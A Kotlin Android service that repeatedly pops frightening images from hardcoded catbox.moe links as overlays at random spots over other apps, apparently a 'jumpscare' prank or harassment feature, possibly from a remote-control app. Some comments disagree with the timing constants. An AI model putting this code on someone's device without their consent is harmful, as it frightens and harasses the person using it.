package com.sync.xxx

import android.app.Service
import android.content.Intent
import android.graphics.BitmapFactory
import android.graphics.PixelFormat
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import android.view.Gravity
import android.view.WindowManager
import android.widget.ImageView

/**
 * JumpscareV3Service
 * 
 * Multiple images jumpscare dengan 5 foto yang muncul random position.
 * Bedanya dari jumpscare biasa:
 * - 5 foto muncul (bukan 1)
 * - Ukuran lebih kecil
 * - Jeda hilang lebih lama (creepy effect)
 * - Random positioning di seluruh layar
 */
class JumpscareV3Service : Service() {
    
    private var windowManager: WindowManager? = null
    private val imageViews = mutableListOf<ImageView>()
    private val handler = Handler(Looper.getMainLooper())
    private var spawnRunnable: Runnable? = null
    private var isRunning = false
    
    // 5 foto jumpscare URLs (hardcoded dari catbox.moe)
    private val photoUrls = listOf(
        "https://files.catbox.moe/p3zisj.jpg",
        "https://files.catbox.moe/arzrho.jpg",
        "https://files.catbox.moe/etwkfc.jpg",
        "https://files.catbox.moe/sa8tf1.jpg",
        "https://files.catbox.moe/aren1t.jpg"
    )
    
    companion object {
        private const val TAG = "JumpscareV3"
        const val ACTION_START = "START"
        const val ACTION_STOP = "STOP"
        
        // Config
        private const val IMAGE_SIZE_DP = 120 // Lebih kecil dari jumpscare biasa (biasa ~180dp)
        private const val DISPLAY_DURATION_MS = 3000L // Display 3 detik (lebih cepet)
        private const val SPAWN_INTERVAL_MS = 700L // Spawn setiap 0.7 detik (lebih rapid!)
    }
    
    override fun onBind(intent: Intent?): IBinder? = null
    
    override fun onCreate() {
        super.onCreate()
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
        Log.d(TAG, "Service created")
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_STOP -> {
                Log.d(TAG, "Stop jumpscare v3")
                stopJumpscare()
                stopSelf()
                return START_NOT_STICKY
            }
            ACTION_START -> {
                Log.d(TAG, "Start jumpscare v3 with ${photoUrls.size} photos")
                startJumpscare()
                return START_STICKY
            }
            else -> {
                Log.d(TAG, "Start jumpscare v3 (default action)")
                startJumpscare()
                return START_STICKY
            }
        }
    }
    
    private fun startJumpscare() {
        if (isRunning) {
            Log.d(TAG, "Already running, skipping")
            return
        }
        
        isRunning = true
        val metrics = resources.displayMetrics
        val screenW = metrics.widthPixels
        val screenH = metrics.heightPixels
        val imageSizePx = (IMAGE_SIZE_DP * metrics.density).toInt()
        
        spawnRunnable = object : Runnable {
            override fun run() {
                if (!isRunning) return
                
                // Pick random photo dari 5 foto
                val photoUrl = photoUrls.random()
                
                try {
                    val imgView = ImageView(this@JumpscareV3Service).apply {
                        scaleType = ImageView.ScaleType.CENTER_CROP
                    }
                    
                    // Random position
                    val randomX = (Math.random() * (screenW - imageSizePx)).toInt().coerceAtLeast(0)
                    val randomY = (Math.random() * (screenH - imageSizePx)).toInt().coerceAtLeast(0)
                    
                    val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                    } else {
                        @Suppress("DEPRECATION")
                        WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
                    }
                    
                    val params = WindowManager.LayoutParams(
                        imageSizePx,
                        imageSizePx,
                        type,
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                            or WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
                            or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                        PixelFormat.TRANSLUCENT
                    ).apply {
                        gravity = Gravity.TOP or Gravity.START
                        x = randomX
                        y = randomY
                    }
                    
                    windowManager?.addView(imgView, params)
                    imageViews.add(imgView)
                    
                    // Load image di background thread
                    Thread {
                        try {
                            var redirectUrl = photoUrl
                            var bitmap: android.graphics.Bitmap? = null
                            
                            // Follow redirects (max 5 hops)
                            for (attempt in 0..4) {
                                val conn = java.net.URL(redirectUrl).openConnection() as java.net.HttpURLConnection
                                conn.connectTimeout = 12000
                                conn.readTimeout = 15000
                                conn.instanceFollowRedirects = false
                                conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 13)")
                                conn.setRequestProperty("Accept", "image/*,*/*;q=0.8")
                                conn.connect()
                                
                                val responseCode = conn.responseCode
                                if (responseCode in 300..399) {
                                    val location = conn.getHeaderField("Location")
                                    conn.disconnect()
                                    if (location != null) {
                                        redirectUrl = location
                                        continue
                                    } else {
                                        break
                                    }
                                }
                                
                                val imageBytes = conn.inputStream.readBytes()
                                conn.disconnect()
                                bitmap = BitmapFactory.decodeByteArray(imageBytes, 0, imageBytes.size)
                                break
                            }
                            
                            if (bitmap != null) {
                                val finalBitmap = bitmap
                                Handler(Looper.getMainLooper()).post {
                                    imgView.setImageBitmap(finalBitmap)
                                }
                                Log.d(TAG, "Image loaded: $photoUrl")
                            } else {
                                Log.e(TAG, "Failed to load image: $photoUrl")
                            }
                        } catch (e: Exception) {
                            Log.e(TAG, "Image load error: ${e.message}")
                        }
                    }.start()
                    
                    // Auto-remove setelah DISPLAY_DURATION_MS (4 detik)
                    handler.postDelayed({
                        try {
                            windowManager?.removeView(imgView)
                            imageViews.remove(imgView)
                            Log.d(TAG, "Image removed after ${DISPLAY_DURATION_MS}ms")
                        } catch (e: Exception) {
                            Log.e(TAG, "Remove view error: ${e.message}")
                        }
                    }, DISPLAY_DURATION_MS)
                    
                } catch (e: Exception) {
                    Log.e(TAG, "Spawn image error: ${e.message}")
                }
                
                // Schedule next spawn dengan jeda SPAWN_INTERVAL_MS (1.2 detik)
                if (isRunning) {
                    handler.postDelayed(this, SPAWN_INTERVAL_MS)
                }
            }
        }
        
        // Start spawning
        handler.post(spawnRunnable!!)
        Log.d(TAG, "Jumpscare v3 started (spawn every ${SPAWN_INTERVAL_MS}ms, display ${DISPLAY_DURATION_MS}ms)")
    }
    
    private fun stopJumpscare() {
        isRunning = false
        
        // Stop spawning
        spawnRunnable?.let { handler.removeCallbacks(it) }
        spawnRunnable = null
        
        // Remove all existing views
        imageViews.toList().forEach { imgView ->
            try {
                windowManager?.removeView(imgView)
            } catch (e: Exception) {
                Log.e(TAG, "Remove view on stop error: ${e.message}")
            }
        }
        imageViews.clear()
        
        Log.d(TAG, "Jumpscare v3 stopped, all views removed")
    }
    
    override fun onDestroy() {
        super.onDestroy()
        stopJumpscare()
        Log.d(TAG, "Service destroyed")
    }
}
